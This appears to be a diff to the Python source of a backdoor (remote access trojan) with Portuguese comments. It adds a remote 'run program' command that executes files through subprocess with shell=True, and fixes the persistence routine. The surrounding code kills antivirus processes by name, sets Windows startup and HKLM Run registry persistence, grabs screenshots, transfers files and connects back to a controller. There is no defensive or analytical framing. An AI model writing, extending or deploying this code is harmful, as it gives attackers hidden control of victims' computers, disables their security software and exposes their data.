@@ -11,6 +11,7 @@ import subprocess
 import tempfile
 import pyscreenshot
 import random
+import threading
 
 nome_arquivo='backdoor.exe'
 TEMPDIR = tempfile.gettempdir() # diretório temporario do windows, onde será salvo o backdoor
@@ -25,6 +26,33 @@ TEMPDIR = tempfile.gettempdir() # diretório temporario do windows, onde será s
 
 
 '''
+
+def run(comando): # funcão que vai ser executada por uma thread
+    subprocess.Popen(comando, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+
+def run_program(s , nome_programa):
+    if(os.path.isfile(nome_programa)):
+        sistema = os.name
+        if(sistema == 'nt'):
+            execute = 'start'
+            if('.exe' in nome_programa): # apenas executa o programa
+                comando = nome_programa
+            else:
+                comando = execute + ' ' + nome_programa
+
+        elif(sistema == 'posix'):
+            execute = './'
+            comando = execute + nome_programa
+
+        t = threading.Thread(target=run, args = (comando,), name='run')
+        t.start()
+        print('executando thread')
+        s.send('0')
+    else: # arquivo não existe
+        print('arquivo n existe')
+        s.send('1')
+
 
 def screenshot(s):
     img = pyscreenshot.grab()
@@ -98,7 +126,6 @@ def download(s):
     else:
         s.send('False')
 
-
 # finaliza o processo do antivirus rodando na maquina
 def kill_antivirus():
     with open('av.txt') as f:
@@ -115,8 +142,8 @@ def kill_antivirus():
                 subprocess.Popen( "TASKKILL /F /IM \"{}\" >> NUL".format(p) ,shell=True)
 
 # persistencia -> mesmo depois de reiniciar o virus continua rodando
-def persistencia(os):
-    if(os == 'nt'):
+def persistencia(sistema):
+    if(sistema == 'nt'):
         usuario = os.path.expanduser('~')
         diretorio = '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
         caminho = usuario + diretorio
@@ -128,7 +155,7 @@ def persistencia(os):
             FNULL = open(os.devnull,'w')
             subprocess.Popen("REG ADD HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ /v backdoor /d " + TEMPDIR + "\\" + nome_arquivo, stdout=FNULL, sderr=FNULL)
 
-    elif(os == 'posix'):
+    elif(sistema == 'posix'):
         pass
 
 def conecta(IP, PORT):
@@ -158,6 +185,10 @@ def executa(socket):
                         kill_antivirus()
                     elif(dados == '5'): # screenshot
                         screenshot(socket)
+                    elif(dados == '6'):
+                        programa = socket.recv(1024)
+                        print(programa)
+                        run_program(socket, programa)
                     else:
                         print(dados)
 
